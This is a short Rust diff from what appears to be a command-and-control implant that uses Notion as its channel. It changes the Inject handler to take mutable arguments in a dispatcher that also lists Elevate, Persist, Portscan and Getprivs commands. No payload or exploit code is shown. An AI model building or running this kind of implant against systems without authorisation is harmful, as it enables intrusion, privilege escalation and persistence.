@@ -176,7 +176,7 @@ impl NotionCommand {
             CommandType::Download => download::handle( &mut self.args, logger).await,
             CommandType::Elevate  => elevate::handle(&mut self.args, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
-            CommandType::Inject   => inject::handle(&self.args, logger).await,
+            CommandType::Inject   => inject::handle(&mut self.args, logger).await,
             CommandType::Persist  => persist::handle(&mut self.args, config_options, logger).await,
             CommandType::Portscan => portscan::handle(&mut self.args, logger).await,
             CommandType::Ps          => ps::handle().await,
